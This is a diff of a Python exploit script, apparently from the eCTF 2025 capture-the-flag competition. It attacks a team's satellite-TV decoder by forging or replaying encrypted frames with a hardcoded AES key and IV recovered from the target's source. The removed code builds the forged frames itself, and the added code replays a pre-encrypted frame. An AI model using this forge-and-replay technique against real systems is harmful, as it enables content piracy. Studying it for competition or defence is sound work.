@@ -1,49 +1,32 @@
+"""Pesky Neighbor attack for SEMO
+@author: Gavin Zhong, Liz Grzyb
+@description: Liz - SEMO implements a timestamp check, but provides hardcoded encryption keys in their source code. 
+We were able to generate a new frame with a later timestamp and encrypt it with the provided key and IV. The decoder
+accepts this pirated frame as a valid frame. 
+"""
+
 import time
 import sys
-import struct
+
+# The ectf25 module comes pre-installed in the environment
 from ectf25.utils.decoder import DecoderIntf
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives.padding import PKCS7
-import subprocess
 
-# Encryption Key and IV from recording_back.py
-aes_key = bytes.fromhex("24f6754364b954cfb33671c831da582edb88b942442357d9c95ae94e9f8fe20d")
-cbc_iv = bytes.fromhex("c6d30c124fbe47e86a02fc2a64b230bf")
+def lgmt_channel_1() -> bytes:
+    """Liz Grzyb
+        Play the fake frame with a later timestamp
+    """
+    lgmt_frame_channel1 = b'u\xc4\xd9\nU\x00\x12\x8c\xd4c\'\x9bM\x08\xdb\xf4\'U\xc7\xfc\x8e\xbd\xa2\x89\xde%\xa9\xfbE\xe6\xaeDn\xe8\xa1S!]"4\xb7r.k\xe3xm\xd3w\x86.*Z\x91\xb8\xc8\xcf\xe4\xafK\x13^\x9fk\xd4\xec\xd9\x12g,\xce\x87bT\x8fHN\xfe\x9d\xc9\x03\x07|!\xd3\xe1\x99\n\xd1\x8dKW\xa2\xc0\x1d\xb7'
+    return lgmt_frame_channel1
 
-def encrypt_frame(channel: int, timestamp: int, data: bytes) -> bytes:
-    """Encrypts a frame with AES-CBC."""
-    padder = PKCS7(128).padder()
-    padded_data = padder.update(data) + padder.finalize()
-    
-    # Frame format: Channel (4 bytes) + Reserved (4 bytes) + Timestamp (8 bytes) + Data + Padding
-    frame = struct.pack("<I4xQ", channel, timestamp) + padded_data
-    
-    # Encrypt the frame
-    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(cbc_iv))
-    encryptor = cipher.encryptor()
-    encrypted_frame = encryptor.update(frame) + encryptor.finalize()
-    
-    return encrypted_frame
 
 if __name__ == '__main__':
     print("Running Pesky Neighbor attack")
+    time.sleep(1)
     
-    # Serial port from argument (decoder connection)
-    decoder_port = sys.argv[1]
-    
-    # Channel 1
-    channel = 1
-    start_timestamp = 1888365551233585
-    frame_count = 10
-    
-    for i in range(frame_count):
-        timestamp = start_timestamp + (i * 1000)  # Increment timestamps
-        fake_data = b"PeskyDataFrame"  # Placeholder data
-        encrypted_frame = encrypt_frame(channel, timestamp, fake_data)
-        
-        print(f"Sending encrypted frame {i+1} with timestamp {timestamp}")
-        
-        # Use the TV module to send frames
-        subprocess.run(["python", "-m", "ectf25.tv.run", "34.235.112.89", "26001", decoder_port], check=True)
-    
-    print("Pesky Neighbor attack complete")
+    # The serial port string will be in argv[1]
+    interface = DecoderIntf(sys.argv[1])
+    # Play pirated channel 1 frame
+    interface.decode(lgmt_channel_1())
+    interface.decode(lgmt_channel_1())
+
+    print("Done with pesky Neighbor attack")
